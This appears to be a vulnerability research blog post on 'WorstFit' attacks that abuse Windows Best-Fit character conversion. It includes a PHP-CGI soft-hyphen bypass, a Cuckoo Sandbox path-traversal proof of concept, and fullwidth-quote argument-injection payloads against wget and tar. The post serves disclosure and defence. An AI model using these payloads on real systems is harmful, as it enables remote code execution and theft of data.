<p><em>(<strong>Updated</strong>: After this article was published, we learned that <a href="https://x.com/hasegawayosuke">Yosuke HASEGAWA</a> also mentioned this behavior at <a href="https://www.blackhat.com/presentations/bh-jp-08/bh-jp-08-Hasegawa/BlackHat-japan-08-Hasegawa-Char-Encoding.pdf">Black Hat Japan 2008</a>, covering part of our Filename Smuggling in Japanese code page.)</em></p>

<p>But this time, we’re taking big steps forward – showing how those sneaky Best-Fit conversions can operate on a <strong>system-wide level</strong>, leading to even more impactful exploits, all unfolding right under your nose.</p>

<p>Now, it’s time to turn this quirky behaviour into something more impactful: <strong>real WorstFit vulnerabilities</strong>.</p>

<p><br /></p>

<h2 id="it-was-the-worst-of-fit--the-novel-attack-surface-on-windows">It was the Worst of Fit – The novel attack surface on Windows</h2>

<p>By delving into the Best-Fit feature, we can harness this unexpected character transformation as a brand-new attack surface on Windows systems. Here, we’ll explore three intriguing attack techniques that exploit this behavior: <strong>Filename Smuggling</strong>, <strong>Argument Splitting</strong> and <strong>Environment Variable Confusion</strong>.</p>

<p>Let’s dive into each of these techniques to see how this seemingly thoughtful (at least, from Microsoft’s perspective at the time) feature can lead to critical vulnerabilities!</p>

<h3 id="-the-nightmare-of-east-asia---cve-2024-4577">🔥 The nightmare of East-Asia - CVE-2024-4577:</h3>

<p>The first ever WorstFit attack is CVE-2024-4577. This vulnerability allows attackers to compromise any PHP-CGI server configured with Chinese or Japanese code pages using nothing more than a <code class="language-plaintext highlighter-rouge">?%ADs</code> request!</p>

<blockquote>
  <p><strong>Affected Code Pages</strong>: 932 (Japanese), 936 (Simplified Chinese), 950 (Traditional Chinese)<br />
<strong>Threat Characters</strong>: <code class="language-plaintext highlighter-rouge">&amp;shy;</code> <a href="https://www.compart.com/en/unicode/U+00AD">U+00AD</a></p>
</blockquote>

<p>Back in 2012, a vulnerability in PHP-CGI was discovered. The issue stemmed from Apache automatically treating the query string as the first argument for the CGI program. Exploitation was straightforward – argument injection. By appending <code class="language-plaintext highlighter-rouge">?-s</code> to a request, attackers could leak the page’s source code. Furthermore, it’s also possible to achieve Remote Code Execution (RCE).</p>

<p>Of course, PHP quickly patched the issue. The fix was also simple: stop parsing arguments if the query string starts with a dash.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">((</span><span class="n">qs</span> <span class="o">=</span> <span class="nb">getenv</span><span class="p">(</span><span class="s2">"QUERY_STRING"</span><span class="p">))</span> <span class="o">!=</span> <span class="kc">NULL</span> <span class="o">&amp;&amp;</span> <span class="nb">strchr</span><span class="p">(</span><span class="n">qs</span><span class="p">,</span> <span class="s1">'='</span><span class="p">)</span> <span class="o">==</span> <span class="kc">NULL</span><span class="p">)</span> <span class="p">{</span>
   <span class="cm">/* ... omitted ... */</span>
   <span class="k">for</span> <span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">decoded_qs</span><span class="p">;</span> <span class="o">*</span><span class="n">p</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">p</span> <span class="o">&lt;=</span> <span class="s1">' '</span><span class="p">;</span> <span class="n">p</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* skip leading spaces */</span> <span class="p">}</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">p</span> <span class="o">==</span> <span class="s1">'-'</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">skip_getopt</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
   <span class="p">}</span>
    <span class="cm">/* ... omitted ... */</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The patch worked well, and no one broke it for the past 12 years. However, while reviewing the patch, we couldn’t help but feel that this blacklist approach seemed weak. After some quick fuzzing, we discovered a simple bypass: appending <code class="language-plaintext highlighter-rouge">?%ADs</code> to the query string effortlessly!</p>

<p>As investigating more, we discovered that U+00AD (soft hyphen) is mapped to a dash (-) on Chinese (936, 950) and Japanese (932) code pages due to <strong>Best-Fit</strong> behavior, which explains how the bypass works.</p>

<p>This is the first time we’ve encountered the term “Best-Fit”. We found it super interesting, which motivated us to take a deeper look.</p>

<h3 id="-filename-smuggling">🔥 Filename Smuggling</h3>

<p>The next attack we would like to introduce is the WorstFit in the filename processing. Here, we focus on characters that mapped to either <strong>”/” (0x2F)</strong> or <strong>”\” (0x5C)</strong>, such as the currency symbol <a href="https://en.wikipedia.org/wiki/Won_sign">Yen (¥)</a>, and <a href="https://en.wikipedia.org/wiki/Yen_and_yuan_sign">Won (₩)</a> used in Japanese and Korean Code Pages, as well as the <a href="https://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_(Unicode_block)">fullwidth</a> version of the (back-)slash in most Code Pages. You can check the affected characters and Code Pages on our <a href="https://worst.fit/mapping/">Best-fit Mapping Grepper</a> tool!</p>

<ul>
  <li><a href="https://worst.fit/mapping/#to%3A0x2f">Characters mapped to “/” (0x2F)</a></li>
  <li><a href="https://worst.fit/mapping/#to%3A0x5c">Characters mapped to “\” (0x5C)</a></li>
</ul>

<blockquote>
  <p><strong>Relevant API</strong>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcurrentdirectory"><code class="language-plaintext highlighter-rouge">GetCurrentDirectoryA</code></a>, <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd?view=msvc-170"><code class="language-plaintext highlighter-rouge">getcwd</code></a>, <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilea"><code class="language-plaintext highlighter-rouge">FindFirstFileA</code></a>, <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/findfirst-functions?view=msvc-170"><code class="language-plaintext highlighter-rouge">findfirst*</code></a>, <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfullpathnamea"><code class="language-plaintext highlighter-rouge">GetFullPathNameA</code></a>, …<br />
<strong>Affected Code Pages</strong>: 874, 125x, 932 (JP), 949 (KR)<br />
<strong>Threat Characters</strong>: <code class="language-plaintext highlighter-rouge">／</code> <a href="https://www.compart.com/en/unicode/U+FF0F">U+FF0F</a>, <code class="language-plaintext highlighter-rouge">＼</code> <a href="https://www.compart.com/en/unicode/U+FF3C">U+FF3C</a>, <code class="language-plaintext highlighter-rouge">¥</code> <a href="https://www.compart.com/en/unicode/U+00A5">U+00A5</a> (JP), <code class="language-plaintext highlighter-rouge">₩</code> <a href="https://www.compart.com/en/unicode/U+20A9">U+20A9</a> (KR)</p>
</blockquote>

<p>Let’s start with a simple case. In Chrome V8, the underlying implementation of its Developer Shell (<code class="language-plaintext highlighter-rouge">d8.exe</code>) uses the ANSI API <code class="language-plaintext highlighter-rouge">GetCurrentDirectoryA()</code> to obtain the current working directory. This means that if we can have a working directory with malicious Unicode characters, these characters will automatically be converted into path traversal payloads when accessed via the ANSI API. As a result, it leads to an unintended file access.</p>

<p><img src="/assets/img/blog/20250109/4.png" alt="" />
<em>↑ Unintended file access on the <code class="language-plaintext highlighter-rouge">C:/windows/win.ini</code>:</em></p>

<p>Another case is the implementation of mruby <a href="https://github.com/mruby/mruby/blob/3.3.0/mrbgems/mruby-dir/src/dir.c#L23"><code class="language-plaintext highlighter-rouge">Dir.getwd()</code></a> on Windows, the function relied on the ANSI version of CRT (C Runtime Library) <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170"><code class="language-plaintext highlighter-rouge">_getcwd()</code></a> to retrieve the current directory. This also means that we can pollute that function’s return value, leading to Path Traversal, too!</p>

<p><img src="/assets/img/blog/20250109/5.png" alt="" />
<em>↑ Pollute the return value of <code class="language-plaintext highlighter-rouge">Dir.getwd()</code>:</em></p>

<p>Of course, the above cases are still bugs instead of real vulnerabilities. Let’s take a look at some real-world cases!</p>

<h4 id="-case-study---path-traversal-to-rce-on-cuckoo-sandbox">➤ Case Study - Path Traversal to RCE on Cuckoo Sandbox</h4>

<p>Before diving into the vulnerability, it’s important to discuss Python first because it plays a significant role in this case! Conceptually, Python allows strings to be represented in two different types: <code class="language-plaintext highlighter-rouge">str</code> and <code class="language-plaintext highlighter-rouge">unicode</code> in Python 2, or <code class="language-plaintext highlighter-rouge">str</code> and <code class="language-plaintext highlighter-rouge">bytes</code> in Python 3.</p>

<p>To support both string representations, the implementation of filesystem access used a structure field to determine whether a target path was wide or narrow. If the string was narrow, the corresponding ANSI API was used to process the path, making it susceptible to the Best-Fit behavior. Although <a href="https://peps.python.org/pep-0529/">PEP 529</a> later standardized the filesystem encoding on Windows to UTF-8, earlier versions — such as Python 2 and Python 3 (prior to version 3.6) — remained vulnerable to WorstFit attacks.</p>

<p>With the above context in mind, let’s have our first target — <a href="https://cuckoosandbox.org/index.html">Cuckoo Sandbox</a>, a well-known automated malware analysis platform. As one of the few open-source solutions for malware analysis in early days, it was the go-to choice for organizations building their own platforms, and for malware researchers seeking to extend its functionality. However, since Cuckoo has not been actively maintained for many years, the latest official version still relies on Python 2.7, which exposes it to our WorstFit Attack!</p>

<p>Cuckoo consists of two main components: the <strong>Cuckoo Host</strong> and the <strong>VM Cluster</strong>. The uploaded samples are isolated within virtual machines to ensure they do not affect the Cuckoo. The components use a dedicated channel to synchronize the behaviors such as captured network packets, dropped files, and output logs with their own mechanism. However, since the Cuckoo Host is written in Python and relied on an outdated version, a dropped file with a Unicode filename can traverse the path on the Cuckoo Host!</p>

<p>Here’s a simple Proof of Concept:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">LPCWSTR</span> <span class="n">filePath</span> <span class="o">=</span> <span class="s">L"AAAA\u00a5..\u00a5..\u00a5..\u00a5..\u00a5..\u00a5conf\u00a5cuckoo.conf"</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFileW</span><span class="p">(</span>
        <span class="n">filePath</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CREATE_ALWAYS</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span>
    <span class="p">);</span>
    
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Once the analysis has finished, users can view the logs and dropped files generated by the malware through the web interface. An attacker can trigger a file operation on Python by clicking the download button. The Cuckoo Host then processes a translated path, containing <code class="language-plaintext highlighter-rouge">../</code> and sends sensitive data to the attacker.</p>

<p><img src="/assets/img/blog/20250109/6.png" alt="" /></p>

<p>The attacker can then download <code class="language-plaintext highlighter-rouge">cuckoo.conf</code>, and gathered several sensitive information to calculate the Flask PIN code, ultimately achieving RCE on the Sandbox Host!</p>

<iframe width="100%" height="315" src="https://www.youtube.com/embed/EeMcDT95WSM?si=NJ8xmmWNEICeq-d7" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>

<p><br /></p>

<h3 id="-argument-splitting">🔥 Argument Splitting</h3>

<p>We can also exploit the WorstFit behavior in command line parsing by manipulating the output of <code class="language-plaintext highlighter-rouge">GetCommandLineA</code>. With this trick, even if you can control just a small part of an argument, that’s more than enough to inject as many arguments as you want!</p>

<p>This time, we’re zeroing in on characters that map to either a double quote (<code class="language-plaintext highlighter-rouge">"</code>, 0x22) or a backslash (<code class="language-plaintext highlighter-rouge">\</code>, 0x5C). Once again, fullwidth characters come in handy here, and when it comes to backslashes, those currency symbols we talked about earlier make a comeback!</p>

<ul>
  <li><a href="https://worst.fit/mapping/#to%3A0x22">Characters mapped to <code class="language-plaintext highlighter-rouge">"</code> (0x22)</a></li>
  <li><a href="https://worst.fit/mapping/#to%3A0x5c">Characters mapped to <code class="language-plaintext highlighter-rouge">\</code> (0x5C)</a></li>
</ul>

<blockquote>
  <p><strong>Relevant API</strong>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea"><code class="language-plaintext highlighter-rouge">GetCommandlineA</code></a>, <a href="https://learn.microsoft.com/en-us/cpp/c-language/main-function-and-program-execution?view=msvc-170"><code class="language-plaintext highlighter-rouge">int main()</code></a><br />
<strong>Affected Code Pages</strong>: 874, 125x, 932 (JP), 949 (KR)<br />
<strong>Threat Characters</strong>: <code class="language-plaintext highlighter-rouge">＂</code> <a href="https://www.compart.com/en/unicode/U+FF02">U+FF02</a>, <code class="language-plaintext highlighter-rouge">＼</code> <a href="https://www.compart.com/en/unicode/U+FF3C">U+FF3C</a>, <code class="language-plaintext highlighter-rouge">¥</code> <a href="https://www.compart.com/en/unicode/U+00A5">U+00A5</a> (JP), <code class="language-plaintext highlighter-rouge">₩</code> <a href="https://www.compart.com/en/unicode/U+20A9">U+20A9</a> (KR)</p>
</blockquote>

<p>Let’s circle back to the piece of code we discussed earlier. How might this seemingly simple snippet fail, and more importantly, how could an attacker exploit it?</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
  <span class="nv">$url</span> <span class="o">=</span> <span class="s2">"https://example.tld/"</span> <span class="mf">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">".txt"</span><span class="p">;</span>
  <span class="nb">system</span><span class="p">(</span><span class="s2">"wget.exe -q "</span> <span class="mf">.</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$url</span><span class="p">));</span>
</code></pre></div></div>

<p>The answer is quite simple. If an attacker provides the input: <code class="language-plaintext highlighter-rouge">＂ --use-askpass=calc ＂</code>
It could pop <strong>calc.exe</strong> on the system!</p>

<p>At this point, you might be thinking, <em>“Oh, it’s PHP messing up again, isn’t it? I know PHP always…”</em> But nope – even switching to <strong>Node.js</strong>, <strong>Rust</strong>, or <strong>Python</strong> doesn’t save you. Here’s an example in Python, and the same input works like a charm – this time on the latest version of Python, not just older ones:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/fetch'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">fetch</span><span class="p">():</span>
    <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'path'</span><span class="p">)</span>
    <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">([</span><span class="s">"wget"</span><span class="p">,</span> <span class="s">"-q"</span><span class="p">,</span> <span class="sa">f</span><span class="s">"https://example.tld/</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s">.txt"</span><span class="p">])</span>
    <span class="k">return</span> <span class="s">"Done"</span>
</code></pre></div></div>

<p>So, is this wget’s problem? Well, spoiler alert: yes, it’s part of the issue, but it doesn’t stop there. The same trick works on other executables like <strong>openssl.exe</strong>, <strong>tar.exe</strong>, <strong>java.exe</strong>, and more CLI tools. This makes us realize, this can actually be a broader systemic issue with how argument handling works on Windows, creating an attack surface across various tools. So, how does it happen?</p>

<p>Let’s back to our payload <code class="language-plaintext highlighter-rouge">＂ --use-askpass=calc ＂</code>. I guess now some of you might still be wondering: <em>Wait, how does a simple double quote bypass the escaping? What exactly does it escape, then?</em> Well, first of all, these aren’t just regular double quotes (<code class="language-plaintext highlighter-rouge">U+0022</code>) — they’re actually <strong>fullwidth double quotes</strong> (<code class="language-plaintext highlighter-rouge">U+FF02</code>) 😉. Thanks to the Best-Fit feature, in code pages like 125x and 874, fullwidth double quotes are automatically converted into standard double quotes (<a href="https://worst.fit/mapping/#from%3A0xFF02%20to%3A0x22">🔍</a>).</p>

<p>But still, why can these double quotes alter the arguments?</p>

<p>Firstly, on Windows, the <strong>entire command line</strong> is passed as a single string to the spawned process, leaving it up to the executable to parse. That’s why the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw">CreateProcess API</a> accepts the <code class="language-plaintext highlighter-rouge">lpCommandLine</code> parameter directly. This differs from UNIX-like systems, where arguments are always passed as an array of strings. For a more detailed explanation of argument parsing on Windows, check out <a href="https://daviddeley.com/autohotkey/parameters/parameters.htm#WIN">this article</a> by David Deley.</p>

<p><img src="/assets/img/blog/20250109/7.png" alt="" /></p>

<p>Secondly, because the command line string is stored internally in wide character (Unicode) format, retrieving its ANSI string version involves Windows using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea"><code class="language-plaintext highlighter-rouge">GetCommandLineA</code></a> API.  Which of course the Best-Fit feature is applied during this process, potentially altering the command line in subtle but impactful ways.</p>

<p>But actually, there isn’t a single “standard” way to parse the command line on Windows. However, the parsing convention typically adheres to the rules of <a href="https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-commandlinetoargvw"><code class="language-plaintext highlighter-rouge">CommandLineToArgvW</code></a> or <a href="https://learn.microsoft.com/en-us/cpp/cpp/main-function-command-line-args#parsing-c-command-line-arguments">CRT command-line parsing</a>. In practice, most developers use either <code class="language-plaintext highlighter-rouge">CommandLineToArgvW</code> or CRT standard <code class="language-plaintext highlighter-rouge">int main(...)</code> to handle command-line arguments, so I’d say we can pretty much treat this as the standard. The key characters involved in the parsing process include:</p>

<ul>
  <li><strong>Tabs (0x09) and spaces (0x20)</strong>: Used to separate arguments (except when in quote mode).</li>
  <li><strong><code class="language-plaintext highlighter-rouge">"</code> (0x22)</strong>: Toggles the quote mode to treat spaces as part of the argument.</li>
  <li><strong><code class="language-plaintext highlighter-rouge">\</code> (0x5C)</strong>: Escapes double quotes and backslashes when used in a specific sequence.</li>
</ul>

<p>These conventions form the foundation of how arguments are interpreted and passed to executables.</p>

<p>Therefore, standard libraries and functions in most programming languages adhere to these parsing rules to sanitize user-provided arguments.  For instance, in <strong>PHP</strong>, the <a href="https://www.php.net/manual/en/function.escapeshellarg.php"><code class="language-plaintext highlighter-rouge">escapeshellarg</code></a> function replaces double quotes with spaces, wraps the argument in quotes, and escapes backslashes as needed to ensure safe execution in the shell.  Similarly, in <strong>Python</strong>, the <code class="language-plaintext highlighter-rouge">subprocess</code> module internally uses the <a href="https://github.com/python/cpython/blob/v3.12.8/Lib/subprocess.py#L576"><code class="language-plaintext highlighter-rouge">list2cmdline</code></a> function to convert a Python list into a command line string, escaping arguments strictly according to the Microsoft CRT command-line parsing logic.</p>

<p>However, all of this escaping happens before the Best-Fit feature comes into play. This means that even carefully escaped arguments can still be altered during the ANSI conversion process.</p>

<p>Here’s a simple example. Using the example Python code we provided, let’s examine what happens when <code class="language-plaintext highlighter-rouge">wget.exe</code> is spawned with <code class="language-plaintext highlighter-rouge">subprocess</code> module. The entire argument parsing process would look something like this:</p>

<p><img src="/assets/img/blog/20250109/8.png" alt="" /></p>

<p>As we saw, fullwidth quotation marks (<code class="language-plaintext highlighter-rouge">U+FF02</code>) are transformed into regular double quotes (<code class="language-plaintext highlighter-rouge">U+0022</code>) during the Best-Fit conversion process. This subtle alteration changes the original command-line syntax, enabling argument-splitting behavior.</p>

<p>Furthermore, even programs that don’t directly use <code class="language-plaintext highlighter-rouge">GetCommandLineA</code> can still be vulnerable to this attack if they rely on the non-Unicode version of the main function. Yes, we’re talking about the <strong>innocent-looking <code class="language-plaintext highlighter-rouge">int main()</code></strong>!</p>

<p>Here we can do a small experiment. Given this piece of code</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[])</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">argc</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"argv[%d] = %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Now, when we run the command <code class="language-plaintext highlighter-rouge">.\test.exe "foo＂ ＂bar"</code>, it does produce two arguments, as shown below.</p>

<p><img src="/assets/img/blog/20250109/9.png" alt="" /></p>

<p>And yes, Python’s <code class="language-plaintext highlighter-rouge">subprocess</code> module can’t prevent this. Even if the entire string is passed as a single list element, it still ends up being parsed into two separate arguments.</p>

<p><img src="/assets/img/blog/20250109/10.png" alt="" /></p>

<p>The reason a normal <code class="language-plaintext highlighter-rouge">main</code> function becomes vulnerable lies in how the <strong>C runtime (CRT)</strong> handles command-line arguments.  Even if you don’t explicitly call <code class="language-plaintext highlighter-rouge">GetCommandLineA</code>, once you use the <code class="language-plaintext highlighter-rouge">int main()</code> function, the compiler secretly generates a <code class="language-plaintext highlighter-rouge">mainCRTStartup</code> function inside your binary for you. This startup function is linked to the C runtime library (e.g., <code class="language-plaintext highlighter-rouge">ucrtbase.dll</code>), which internally retrieves the command line using an ANSI API and parses it for you. And that’s where the vulnerability creeps in.</p>

<p><img src="/assets/img/blog/20250109/11.png" alt="" /></p>

<p>This is why so many executables are exposed to WorstFit vulnerabilities. Worse still, as the attack exploits behavior at the system level during the conversion process, <strong>no standard library in any programming language can fully stop our attack!</strong></p>

<p>However, only on 125x and 874 code pages does the fullwidth quotation mark (<code class="language-plaintext highlighter-rouge">U+FF02</code>) get converted into a normal double quote. So, what about CJK (Chinese, Japanese and Korean) languages? Are they safe now? Not entirely. Double quote is NOT the only character we can use for this attack!</p>

<p>As mentioned in the <strong>Filename Smuggling</strong> section, the Yen sign (<code class="language-plaintext highlighter-rouge">U+00A5</code>) on the Japanese (932) code page and the Won sign (<code class="language-plaintext highlighter-rouge">U+20A9</code>) on the Korean (949) code page are both converted into a <strong>backslash (<code class="language-plaintext highlighter-rouge">\</code>)</strong>. And what can a backslash do? Quite a lot! As we’ve discussed, the backslash is crucial for escaping characters and altering the syntax of a command line. This means it can be exploited to manipulate command execution.</p>

<p>Let’s take this Python code as an example:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">([</span><span class="s">'vuln.exe'</span><span class="p">,</span> <span class="s">'foo¥" bar'</span><span class="p">])</span>
</code></pre></div></div>
<p>Here, Python handles escaping for us – in this case, escaping the double quote. After escaping, the command line should look like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vuln.exe "foo¥\" bar"
</code></pre></div></div>

<p>Python prepends a backslash before the double quote to escape it. Everything seems fine, so Python passes this command line to the <code class="language-plaintext highlighter-rouge">CreateProcessW</code> API, and <code class="language-plaintext highlighter-rouge">vuln.exe</code> spawns successfully. Great!</p>

<p>However, here’s where it gets tricky. The <code class="language-plaintext highlighter-rouge">vuln.exe</code> program uses an <strong>ANSI API</strong> to retrieve the command line. Thanks to the Best-Fit feature (again 😜), the Yen sign (<code class="language-plaintext highlighter-rouge">¥</code>) is converted into a backslash (<code class="language-plaintext highlighter-rouge">\</code>). Now, the command line seen by <code class="language-plaintext highlighter-rouge">vuln.exe</code> becomes:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vuln.exe "foo\\" bar"
</code></pre></div></div>

<p>The backslash added by Python is now escaped by the “ex-Yen-sign”. As a result, that double quote is no longer properly escaped, allowing it to act as a delimiter. The arguments for <code class="language-plaintext highlighter-rouge">vuln.exe</code> are now split into two parts: <code class="language-plaintext highlighter-rouge">foo\</code> and <code class="language-plaintext highlighter-rouge">bar</code>.</p>

<p><em><strong>Note</strong>: Of course, characters that can be converted into spaces or tabs can also be exploited for argument splitting. I’ll leave this part as an exercise for you 😉.</em></p>

<p>Now, we already explored most of the possible ways to exploit WorstFit for argument splitting. Let’s dive into some real-world exploits and see this attack in action!</p>

<h4 id="-case-study-1---elfinder-rce-w-windows-built-in-gnu-tar">➤ Case Study 1 - ElFinder: RCE w/ Windows built-in GNU Tar</h4>

<p>Here, one of our case studies highlights an RCE (Remote Code Execution) attack on <a href="https://github.com/Studio-42/elFinder"><strong>ElFinder</strong></a>, caused by the WorstFit vulnerability in Windows’ <code class="language-plaintext highlighter-rouge">tar.exe</code> command.</p>

<p>ElFinder is a popular open-source, web-based file manager with a PHP backend. By default, it supports Windows servers and comes with a built-in feature for creating and extracting archives, which is also enabled by default.</p>

<p>The way it handles archive formats is straightforward—it directly executes shell commands.  Sounds risky? Perhaps. But the developers have taken precautions by escaping all arguments properly using <code class="language-plaintext highlighter-rouge">escapeshellarg</code> (<a href="https://github.com/Studio-42/elFinder/blob/7544918a2ba656a4fe72a6fc8bb502d39f601cda/php/elFinderVolumeDriver.class.php#L6898-L6911"><code class="language-plaintext highlighter-rouge">php/elFinderVolumeDriver.class.php#L6898-L6911</code></a>).</p>

<p><img src="/assets/img/blog/20250109/12.png" alt="" /></p>

<p>Despite this effort, escaping at the application level might not fully mitigate risks if quirks like the Best-Fit feature in Windows are involved.</p>

<p>One of the archive formats supported by ElFinder is the <strong>tar</strong> format. It uses the system’s built-in <code class="language-plaintext highlighter-rouge">tar.exe</code> command to create or extract archives. For example, if we create an archive named <code class="language-plaintext highlighter-rouge">foobar.tar</code> containing the files <code class="language-plaintext highlighter-rouge">foo.txt</code> and <code class="language-plaintext highlighter-rouge">bar.txt</code>, ElFinder would just execute the following command: <code class="language-plaintext highlighter-rouge">tar.exe -chf "foobar.tar" ".\foo.txt" ".\bar.txt"</code></p>

<p>However, we discovered that the Windows built-in <code class="language-plaintext highlighter-rouge">tar.exe</code> command is vulnerable to the <strong>WorstFit</strong> attack! This means that if you can control even a small part of an argument, it’s possible to execute arbitrary commands. For details, check out our <a href="https://worst.fit/worstfit/Arg-Splitting/tar/">curated list</a>.</p>

<p>To exploit this, we can simply name the tar file as <code class="language-plaintext highlighter-rouge">aaa＂ ＂--use-compress-program=calc＂ ＂bbb.tar</code> (<code class="language-plaintext highlighter-rouge">＂</code> is <code class="language-plaintext highlighter-rouge">U+FF02</code>). This injects the <code class="language-plaintext highlighter-rouge">--use-compress-program</code> parameter, which allows arbitrary command execution. In our demonstration, this results in popping up <code class="language-plaintext highlighter-rouge">calc.exe</code>.</p>

<iframe width="100%" height="315" src="https://www.youtube.com/embed/DPIp42-Ls0U?si=dczou7dD-p4CSOQ9" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>

<blockquote>
  <p>In this demonstration, we use an English-configured Windows server (Code Page 1252) as an example. This technique should also work on other 125x code pages and Code Page 874 configurations.</p>
</blockquote>

<h4 id="-case-study-2---all-the-ways-to-code-execution">➤ Case Study 2+ - All the Ways to Code Execution</h4>

<p>Of course, there are more applications are indirectly exposed to WorstFit vulnerabilities because they invoke other executables that are themselves vulnerable to this. Here we demonstrate two examples:</p>

<p>The first one involves a modified version of plink.exe used in <strong>TortoiseGit</strong>. When a user enters a malicious URI for cloning, it can trigger code execution. For details, check out our <a href="https://worst.fit/worstfit/Arg-Splitting/plink/">curated list</a>.</p>

<iframe width="100%" height="315" src="https://www.youtube.com/embed/EF1U-C0e_9E?si=oEKebidfQ1hRIead" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>

<p>The second example involves <strong>RStudio</strong>, which supports version control with SVN. If an SVN project is placed in a maliciously crafted folder, a single click can trigger a calculator to pop up on the user’s machine! For more details, check out our <a href="https://worst.fit/worstfit/Arg-Splitting/SVN/">curated list</a>.</p>

<iframe width="100%" height="315" src="https://www.youtube.com/embed/YKw4ZcQ75Hc?si=Gd6pZ7r4wLToX15m" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>

<h4 id="-case-study-3---microsoft-excel-remote-code-execution-cve-2024-49026">➤ Case Study 3 - Microsoft Excel Remote Code Execution <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49026">CVE-2024-49026</a></h4>

<p>While re-mounting Argument Injection to applications, we discovered that the Argument Splitting attack can be combined with the “Open-With” feature to escalate its impact!</p>

